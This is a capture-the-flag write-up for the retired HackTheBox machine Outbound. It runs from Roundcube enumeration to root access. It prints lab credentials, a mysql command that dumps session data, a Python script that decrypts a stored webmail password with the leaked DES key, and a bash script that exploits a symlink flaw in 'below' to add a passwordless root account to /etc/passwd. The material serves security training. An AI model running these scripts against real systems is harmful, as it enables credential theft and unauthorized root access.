---
title: Outbound
summary: "Full walkthrough of the retired machine Outbound from HackTheBox"
date: 2025-11-15
tag: htb-machines
permalink: /HackTheBox/Machines/Outbound.md
---

![](/images/posts/outbound.png)
[https://app.hackthebox.com/machines/Outbound](https://app.hackthebox.com/machines/Outbound)

---

>[!info] Initial Creds
>As is common in real life pentests, you will start the box with credentials for the following account:
>tyler : LhKL1o9Nm3X2

# Enumeration

## `nmap` scan : 

```bash
$ nmap -sV -sC 10.10.11.17

Nmap scan report for 10.10.11.77
Host is up (0.28s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.12 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 0c:4b:d2:76:ab:10:06:92:05:dc:f7:55:94:7f:18:df (ECDSA)
|_  256 2d:6d:4a:4c:ee:2e:11:b6:c8:90:e6:83:e9:df:38:b0 (ED25519)
80/tcp open  http    nginx 1.24.0 (Ubuntu)
|_http-server-header: nginx/1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to http://mail.outbound.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

- `mail.outbound.htb`
- Add it to `/etc/hosts`

## Web enumeration

![](/images/posts/outbound_000174.png)

- we have `Roundcube` Webmail
- we can log in using provided creds 
- we can found its version in **About** section 

![](/images/posts/outbound_000175.png)

- this version is vulnerable to **CVE_2025_49113**

## Foothold 

- There is a metasploit exploitation for this 

![](/images/posts/outbound_000176.png)

# Post-exploitation 

## jacob user

- `www-data` has access to webapp source code in `/var/www/roundcube`
- by checking `~/html/roundcube/config/config.inc.php` we can find some credentials 

```php
<?php

/*
 +-----------------------------------------------------------------------+
 | Local configuration for the Roundcube Webmail installation.           |
 |                                                                       |
 | This is a sample configuration file only containing the minimum       |
 | setup required for a functional installation. Copy more options       |
 | from defaults.inc.php to this file to override the defaults.          |
 |                                                                       |
 | This file is part of the Roundcube Webmail client                     |
 | Copyright (C) The Roundcube Dev Team                                  |
 |                                                                       |
 | Licensed under the GNU General Public License version 3 or            |
 | any later version with exceptions for skins & plugins.                |
 | See the README file for a full license statement.                     |
 +-----------------------------------------------------------------------+
*/

$config = [];

// Database connection string (DSN) for read+write operations
// Format (compatible with PEAR MDB2): db_provider://user:password@host/database
// Currently supported db_providers: mysql, pgsql, sqlite, mssql, sqlsrv, oracle
// For examples see http://pear.php.net/manual/en/package.database.mdb2.intro-dsn.php
// NOTE: for SQLite use absolute path (Linux): 'sqlite:////full/path/to/sqlite.db?mode=0646'
//       or (Windows): 'sqlite:///C:/full/path/to/sqlite.db'
$config['db_dsnw'] = 'mysql://roundcube:RCDBPass2025@localhost/roundcube';

// IMAP host chosen to perform the log-in.
// See defaults.inc.php for the option description.
$config['imap_host'] = 'localhost:143';

// SMTP server host (for sending mails).
// See defaults.inc.php for the option description.
$config['smtp_host'] = 'localhost:587';

// SMTP username (if required) if you use %u as the username Roundcube
// will use the current username for login
$config['smtp_user'] = '%u';

// SMTP password (if required) if you use %p as the password Roundcube
// will use the current user's password for login
$config['smtp_pass'] = '%p';

// provide an URL where a user can get support for this Roundcube installation
// PLEASE DO NOT LINK TO THE ROUNDCUBE.NET WEBSITE HERE!
$config['support_url'] = '';

// Name your service. This is displayed on the login screen and in the window title
$config['product_name'] = 'Roundcube Webmail';

// This key is used to encrypt the users imap password which is stored
// in the session record. For the default cipher method it must be
// exactly 24 characters long.
// YOUR KEY MUST BE DIFFERENT THAN THE SAMPLE VALUE FOR SECURITY REASONS
$config['des_key'] = 'rcmail-!24ByteDESkey*Str';

// List of active plugins (in plugins/ directory)
$config['plugins'] = [
    'archive',
    'zipdownload',
];

// skin name: folder from skins/
$config['skin'] = 'elastic';
$config['default_host'] = 'localhost';
$config['smtp_server'] = 'localhost';

```

>[!info]
>`config['db_dsnw'] = 'mysql://roundcube:RCDBPass2025@localhost/roundcube';`
>`$config['des_key'] = 'rcmail-!24ByteDESkey*Str';`

- Now , we can access to database and retrieve data (Find **sessions**)
- Using the previous `des_key` , we can decrypt/encrypt **sessions**

```bash
mysql -u roundcube -pRCDBPass2025 -h localhost roundcube -e "SELECT * FROM session"

sess_id: 6a5ktqih5uca6lj8vrmgh9v0oh
changed: 2025-06-08 15:46:40 
ip: 172.17.0.1 
vars: bGFuZ3VhZ2V8czo1OiJlbl9VUyI7aW1hcF9uYW1lc3BhY2V8YTo0OntzOjg6InBlcnNvbmFsIjthOjE6e2k6MDthOjI6e2k6MDtzOjA6IiI7aToxO3M6MToiLyI7fX1zOjU6Im90aGVyIjtOO3M6Njoic2hhcmVkIjtOO3M6MTA6InByZWZpeF9vdXQiO3M6MDoiIjt9aW1hcF9kZWxpbWl0ZXJ8czoxOiIvIjtpbWFwX2xpc3RfY29uZnxhOjI6e2k6MDtOO2k6MTthOjA6e319dXNlcl9pZHxpOjE7dXNlcm5hbWV8czo1OiJqYWNvYiI7c3RvcmFnZV9ob3N0fHM6OToibG9jYWxob3N0IjtzdG9yYWdlX3BvcnR8aToxNDM7c3RvcmFnZV9zc2x8YjowO3Bhc3N3b3JkfHM6MzI6Ikw3UnYwMEE4VHV3SkFyNjdrSVR4eGNTZ25JazI1QW0vIjtsb2dpbl90aW1lfGk6MTc0OTM5NzExOTt0aW1lem9uZXxzOjEzOiJFdXJvcGUvTG9uZG9uIjtTVE9SQUdFX1NQRUNJQUwtVVNFfGI6MTthdXRoX3NlY3JldHxzOjI2OiJEcFlxdjZtYUk5SHhETDVHaGNDZDhKYVFRVyI7cmVxdWVzdF90b2tlbnxzOjMyOiJUSXNPYUFCQTF6SFNYWk9CcEg2dXA1WEZ5YXlOUkhhdyI7dGFza3xzOjQ6Im1haWwiO3NraW5fY29uZmlnfGE6Nzp7czoxNzoic3VwcG9ydGVkX2xheW91dHMiO2E6MTp7aTowO3M6MTA6IndpZGVzY3JlZW4iO31zOjIyOiJqcXVlcnlfdWlfY29sb3JzX3RoZW1lIjtzOjk6ImJvb3RzdHJhcCI7czoxODoiZW1iZWRfY3NzX2xvY2F0aW9uIjtzOjE3OiIvc3R5bGVzL2VtYmVkLmNzcyI7czoxOToiZWRpdG9yX2Nzc19sb2NhdGlvbiI7czoxNzoiL3N0eWxlcy9lbWJlZC5jc3MiO3M6MTc6ImRhcmtfbW9kZV9zdXBwb3J0IjtiOjE7czoyNjoibWVkaWFfYnJvd3Nlcl9jc3NfbG9jYXRpb24iO3M6NDoibm9uZSI7czoyMToiYWRkaXRpb25hbF9sb2dvX3R5cGVzIjthOjM6e2k6MDtzOjQ6ImRhcmsiO2k6MTtzOjU6InNtYWxsIjtpOjI7czoxMDoic21hbGwtZGFyayI7fX1pbWFwX2hvc3R8czo5OiJsb2NhbGhvc3QiO3BhZ2V8aToxO21ib3h8czo1OiJJTkJPWCI7c29ydF9jb2x8czowOiIiO3NvcnRfb3JkZXJ8czo0OiJERVNDIjtTVE9SQUdFX1RIUkVBRHxhOjM6e2k6MDtzOjEwOiJSRUZFUkVOQ0VTIjtpOjE7czo0OiJSRUZTIjtpOjI7czoxNDoiT1JERVJFRFNVQkpFQ1QiO31TVE9SQUdFX1FVT1RBfGI6MDtTVE9SQUdFX0xJU1QtRVhURU5ERUR8YjoxO2xpc3RfYXR0cmlifGE6Njp7czo0OiJuYW1lIjtzOjg6Im1lc3NhZ2VzIjtzOjI6ImlkIjtzOjExOiJtZXNzYWdlbGlzdCI7czo1OiJjbGFzcyI7czo0MjoibGlzdGluZyBtZXNzYWdlbGlzdCBzb3J0aGVhZGVyIGZpeGVkaGVhZGVyIjtzOjE1OiJhcmlhLWxhYmVsbGVkYnkiO3M6MjI6ImFyaWEtbGFiZWwtbWVzc2FnZWxpc3QiO3M6OToiZGF0YS1saXN0IjtzOjEyOiJtZXNzYWdlX2xpc3QiO3M6MTQ6ImRhdGEtbGFiZWwtbXNnIjtzOjE4OiJUaGUgbGlzdCBpcyBlbXB0eS4iO311bnNlZW5fY291bnR8YToyOntzOjU6IklOQk9YIjtpOjI7czo1OiJUcmFzaCI7aTowO31mb2xkZXJzfGE6MTp7czo1OiJJTkJPWCI7YToyOntzOjM6ImNudCI7aToyO3M6NjoibWF4dWlkIjtpOjM7fX1saXN0X21vZF9zZXF8czoyOiIxMCI7
```

- Decoded Base64 `vars` give:

```bash
language|s:5:"en_US";imap_namespace|a:4:{s:8:"personal";a:1:{i:0;a:2:{i:0;s:0:"";i:1;s:1:"/";}}s:5:"other";N;s:6:"shared";N;s:10:"prefix_out";s:0:"";}imap_delimiter|s:1:"/";imap_list_conf|a:2:{i:0;N;i:1;a:0:{}}user_id|i:1;username|s:5:"jacob";storage_host|s:9:"localhost";storage_port|i:143;storage_ssl|b:0;password|s:32:"L7Rv00A8TuwJAr67kITxxcSgnIk25Am/";login_time|i:1749397119;timezone|s:13:"Europe/London";STORAGE_SPECIAL-USE|b:1;auth_secret|s:26:"DpYqv6maI9HxDL5GhcCd8JaQQW";request_token|s:32:"TIsOaABA1zHSXZOBpH6up5XFyayNRHaw";task|s:4:"mail";skin_config|a:7:{s:17:"supported_layouts";a:1:{i:0;s:10:"widescreen";}s:22:"jquery_ui_colors_theme";s:9:"bootstrap";s:18:"embed_css_location";s:17:"/styles/embed.css";s:19:"editor_css_location";s:17:"/styles/embed.css";s:17:"dark_mode_support";b:1;s:26:"media_browser_css_location";s:4:"none";s:21:"additional_logo_types";a:3:{i:0;s:4:"dark";i:1;s:5:"small";i:2;s:10:"small-dark";}}imap_host|s:9:"localhost";page|i:1;mbox|s:5:"INBOX";sort_col|s:0:"";sort_order|s:4:"DESC";STORAGE_THREAD|a:3:{i:0;s:10:"REFERENCES";i:1;s:4:"REFS";i:2;s:14:"ORDEREDSUBJECT";}STORAGE_QUOTA|b:0;STORAGE_LIST-EXTENDED|b:1;list_attrib|a:6:{s:4:"name";s:8:"messages";s:2:"id";s:11:"messagelist";s:5:"class";s:42:"listing messagelist sortheader fixedheader";s:15:"aria-labelledby";s:22:"aria-label-messagelist";s:9:"data-list";s:12:"message_list";s:14:"data-label-msg";s:18:"The list is empty.";}unseen_count|a:2:{s:5:"INBOX";i:2;s:5:"Trash";i:0;}folders|a:1:{s:5:"INBOX";a:2:{s:3:"cnt";i:2;s:6:"maxuid";i:3;}}list_mod_seq|s:2:"10";
```

>[!info]
>- encrypted password : `L7Rv00A8TuwJAr67kITxxcSgnIk25Am/` for user `jacob`

- To know how we can decrypt a password, we need to understand how it was encrypted

![](/images/posts/outbound_000177.png)

- In file ` rcube.php` , we can find how encryption/decryption code

```php
ww-data@mail:/$ cat /var/www/html/roundcube/program/lib/Roundcube/rcube.php


/**
     * Encrypt a string
     *
     * @param string $clear  Clear text input
     * @param string $key    Encryption key to retrieve from the configuration, defaults to 'des_key'
     * @param bool   $base64 Whether or not to base64_encode() the result before returning
     *
     * @return string|false Encrypted text, false on error
     */
    public function encrypt($clear, $key = 'des_key', $base64 = true)
    {
        if (!is_string($clear) || !strlen($clear)) {
            return '';
        }

        $ckey   = $this->config->get_crypto_key($key);
        $method = $this->config->get_crypto_method();
        $iv     = rcube_utils::random_bytes(openssl_cipher_iv_length($method), true);
        $tag    = null;

        // This distinction is for PHP 7.3 which throws a warning when
        // we use $tag argument with non-AEAD cipher method here
        if (!preg_match('/-(gcm|ccm|poly1305)$/i', $method)) {
            $cipher = openssl_encrypt($clear, $method, $ckey, OPENSSL_RAW_DATA, $iv);
        }
        else {
            $cipher = openssl_encrypt($clear, $method, $ckey, OPENSSL_RAW_DATA, $iv, $tag);
        }

        if ($cipher === false) {
            self::raise_error([
                    'file'    => __FILE__,
                    'line'    => __LINE__,
                    'message' => "Failed to encrypt data with configured cipher method: $method!"
                ], true, false);

            return false;
        }

        $cipher = $iv . $cipher;

        if ($tag !== null) {
            $cipher = "##{$tag}##{$cipher}";
        }

        return $base64 ? base64_encode($cipher) : $cipher;
    }

    /**
     * Decrypt a string
     *
     * @param string $cipher Encrypted text
     * @param string $key    Encryption key to retrieve from the configuration, defaults to 'des_key'
     * @param bool   $base64 Whether or not input is base64-encoded
     *
     * @return string|false Decrypted text, false on error
     */
    public function decrypt($cipher, $key = 'des_key', $base64 = true)
    {
        // @phpstan-ignore-next-line
        if (!is_string($cipher) || !strlen($cipher)) {
            return false;
        }

        if ($base64) {
            $cipher = base64_decode($cipher);
            if ($cipher === false) {
                return false;
            }
        }

        $ckey    = $this->config->get_crypto_key($key);
        $method  = $this->config->get_crypto_method();
        $iv_size = openssl_cipher_iv_length($method);
        $tag     = null;

        if (preg_match('/^##(.{16})##/s', $cipher, $matches)) {
            $tag    = $matches[1];
            $cipher = substr($cipher, strlen($matches[0]));
        }

        $iv = substr($cipher, 0, $iv_size);

        // session corruption? (#1485970)
        if (strlen($iv) < $iv_size) {
            return false;
        }

        $cipher = substr($cipher, $iv_size);
        $clear  = openssl_decrypt($cipher, $method, $ckey, OPENSSL_RAW_DATA, $iv, $tag);

        return $clear;
    }
```

- I used the AI ​​generated script to decrypt
```python
from base64 import b64decode
from Crypto.Cipher import DES3

# Encrypted password (base64) from session table
encrypted_password = "L7Rv00A8TuwJAr67kITxxcSgnIk25Am/"

# Full 24-byte des_key from config.inc.php
des_key = b'rcmail-!24ByteDESkey*Str'  # length must be 24 bytes

# Decode base64
data = b64decode(encrypted_password)

# First 8 bytes are IV, rest is ciphertext
iv = data[:8]
ciphertext = data[8:]

# Decrypt using DES3 CBC mode
cipher = DES3.new(des_key, DES3.MODE_CBC, iv)
decrypted = cipher.decrypt(ciphertext)

# Unpad manually (PKCS#5/PKCS#7)
pad_len = decrypted[-1]
if isinstance(pad_len, str):
    pad_len = ord(pad_len)
cleaned = decrypted[:-pad_len].decode('utf-8', errors='ignore')

print("[+] Decrypted password:", cleaned)
```

>[!success] final creds
>jacob : 595mO8DmwGeD

- Log in to webapp with jacob creds

![](/images/posts/outbound_000178.png)

- In his Inbox , i found his credentials 

![](/images/posts/outbound_000179.png)

>[!success] jacob SSH creds
>`jacob`:`gY4Wr3a1evp4`

## Privilege escalation 

- sudo privileges
```bash
jacob@outbound:~$ sudo -l

Matching Defaults entries for jacob on outbound:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User jacob may run the following commands on outbound:
    (ALL : ALL) NOPASSWD: /usr/bin/below *, !/usr/bin/below --config*, !/usr/bin/below --debug*, !/usr/bin/below -d*

```

- by running `below`, we can find its version 

![](/images/posts/outbound_000180.png)

- version `0.8.0` is vulnerable to [CVE-2025-27591](https://www.wiz.io/vulnerability-database/cve/cve-2025-27591)
- exploitation of this vulnerability is a `symlink` attack
- we have to creates a **symbolic link (`symlink`)** in a writable directory pointing to a sensitive file like `/etc/shadow` , `/etc/passwd`
- I will create a new root user in `/etc/passwd` : `ctrlgh0st::0:0:ctrlgh0st:/root:/bin/bash`

```bash
#!/bin/bash

rm /var/log/below/error_root.log
echo 'ctrlgh0st::0:0:ctrlgh0st:/root:/bin/bash' > /tmp/fake
ln -s /etc/passwd /var/log/below/error_root.log
sudo /usr/bin/below record
echo 'ctrlgh0st::0:0:ctrlgh0st:/root:/bin/bash' >> /var/log/below/error_root.log
su ctrlgh0st
```


![](/images/posts/outbound_000181.png)

---

![](/images/posts/outbound_Pwned.png)
